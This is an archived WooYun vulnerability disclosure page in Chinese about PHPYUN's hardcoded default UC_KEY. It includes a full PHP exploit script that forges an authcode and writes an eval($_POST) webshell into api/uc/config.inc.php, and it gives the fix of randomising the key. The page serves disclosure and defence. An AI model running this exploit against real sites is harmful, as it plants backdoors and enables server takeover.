@@ -1,0 +1,283 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PHPYUN设计缺陷导致轻易Getshell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PHPYUN设计缺陷导致轻易Getshell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/felixk3y">felixk3y</a> 
+</li><li>提交时间：		2014-01-22 12:24</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-28：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-14：	细节向普通白帽子公开<br/>
+									2014-03-06：	细节向实习白帽子公开<br/>
+									2014-04-22：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">PHPYUN设计缺陷导致轻易Getshell</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#1 设计缺陷<br />
+<br />
+phpyun集成了部分ucenter功能,引入了UC_KEY，且默认设置为&quot;phpyun123456&quot;<br />
+<br />
+</p><pre><code>define(&quot;UC_KEY&quot;,&quot;phpyun123456&quot;);</code></pre><p class='detail'><br />
+<br />
+你们难道不知道UC_KEY这个值的威力的多大?好吧 我就当你们不知道，详情请见<br />
+<br />
+</p><pre><code> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-048137">WooYun: Discuz的利用UC_KEY进行getshell</a> </code></pre><p class='detail'><br />
+<br />
+</p><pre><code>http://www.2cto.com/Article/201401/272274.html</code></pre><p class='detail'><br />
+<br />
+#2 利用UC_KEY实现Getshell<br />
+<br />
+</p><pre><code>&lt;?php<br />
+// 代码版权归原作者所有！<br />
+    $timestamp = time()+10*3600;<br />
+    $host=&quot;www.vulns.org&quot;;<br />
+    $uc_key=&quot;phpyun123456&quot;;<br />
+    $code=urlencode(_authcode(&quot;time=$timestamp&amp;action=updateapps&quot;, &#039;ENCODE&#039;, $uc_key));<br />
+    $cmd1=&#039;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;<br />
+&lt;root&gt;<br />
+ &lt;item id=&quot;UC_API&quot;&gt;http://x\&#039;);eval($_POST[DOM]);//&lt;/item&gt;<br />
+&lt;/root&gt;&#039;;<br />
+    $cmd2=&#039;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;<br />
+&lt;root&gt;<br />
+ &lt;item id=&quot;UC_API&quot;&gt;http://x&lt;/item&gt;<br />
+&lt;/root&gt;&#039;;<br />
+    $html1 = send($cmd1);<br />
+    echo $html1;<br />
+    $html2 = send($cmd2);<br />
+    echo $html2;<br />
+       <br />
+       <br />
+function send($cmd){<br />
+    global $host,$code;<br />
+    $message = &quot;POST /upload/api/uc/uc.php?code=&quot;.$code.&quot;  HTTP/1.1\r\n&quot;;<br />
+    $message .= &quot;Accept: */*\r\n&quot;;<br />
+    $message .= &quot;Referer: &quot;.$host.&quot;\r\n&quot;;<br />
+    $message .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+    $message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;<br />
+    $message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n&quot;;<br />
+    $message .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;<br />
+    $message .= &quot;Content-Length: &quot;.strlen($cmd).&quot;\r\n&quot;;<br />
+    $message .= &quot;Connection: Close\r\n\r\n&quot;;<br />
+    $message .= $cmd;<br />
+       <br />
+    //var_dump($message);<br />
+    $fp = fsockopen($host, 80);<br />
+    fputs($fp, $message);<br />
+       <br />
+    $resp = &#039;&#039;;<br />
+   <br />
+    while ($fp &amp;&amp; !feof($fp))<br />
+        $resp .= fread($fp, 1024);<br />
+       <br />
+    return $resp;<br />
+}<br />
+   <br />
+function _authcode($string, $operation = &#039;DECODE&#039;, $key = &#039;&#039;, $expiry = 0) {<br />
+	$ckey_length = 4;<br />
+<br />
+	$key = md5($key ? $key : UC_KEY);<br />
+	$keya = md5(substr($key, 0, 16));<br />
+	$keyb = md5(substr($key, 16, 16));<br />
+	$keyc = $ckey_length ? ($operation == &#039;DECODE&#039; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#039;&#039;;<br />
+<br />
+	$cryptkey = $keya.md5($keya.$keyc);<br />
+	$key_length = strlen($cryptkey);<br />
+<br />
+	$string = $operation == &#039;DECODE&#039; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#039;%010d&#039;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;<br />
+	$string_length = strlen($string);<br />
+<br />
+	$result = &#039;&#039;;<br />
+	$box = range(0, 255);<br />
+<br />
+	$rndkey = array();<br />
+	for($i = 0; $i &lt;= 255; $i++) {<br />
+		$rndkey[$i] = ord($cryptkey[$i % $key_length]);<br />
+	}<br />
+<br />
+	for($j = $i = 0; $i &lt; 256; $i++) {<br />
+		$j = ($j + $box[$i] + $rndkey[$i]) % 256;<br />
+		$tmp = $box[$i];<br />
+		$box[$i] = $box[$j];<br />
+		$box[$j] = $tmp;<br />
+	}<br />
+<br />
+	for($a = $j = $i = 0; $i &lt; $string_length; $i++) {<br />
+		$a = ($a + 1) % 256;<br />
+		$j = ($j + $box[$a]) % 256;<br />
+		$tmp = $box[$a];<br />
+		$box[$a] = $box[$j];<br />
+		$box[$j] = $tmp;<br />
+		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));<br />
+	}<br />
+<br />
+	if($operation == &#039;DECODE&#039;) {<br />
+		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {<br />
+			return substr($result, 26);<br />
+		} else {<br />
+				return &#039;&#039;;<br />
+			}<br />
+	} else {<br />
+		return $keyc.str_replace(&#039;=&#039;, &#039;&#039;, base64_encode($result));<br />
+	}<br />
+<br />
+}<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+运行上面的代码<br />
+<br />
+</p><p class="detail"><a href="../images/22121424d3d53688761b06819094dbfe6d038b3a.jpg" target="_blank"><img src="../images/22121424d3d53688761b06819094dbfe6d038b3a.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+即可往 api/uc/config.inc.php 写入恶意的代码<br />
+<br />
+</p><p class="detail"><a href="../images/2212214678cb6a06ebf5d0b0ae084db261d6c86f.jpg" target="_blank"><img src="../images/2212214678cb6a06ebf5d0b0ae084db261d6c86f.jpg" alt="11.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"># SO...<br />
+<br />
+</p><p class="detail"><a href="../images/22122058427eb6148f8488c66ae18c0909b6479f.jpg" target="_blank"><img src="../images/22122058427eb6148f8488c66ae18c0909b6479f.jpg" alt="22.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">可参考Dz的修复方法 UC_KEY安装后随机生成 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/felixk3y" title="felixk3y">felixk3y</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049536" title="PHPYUN设计缺陷导致轻易Getshell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-01-25 14:28</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您的提供，我们会尽快修复！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49536";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
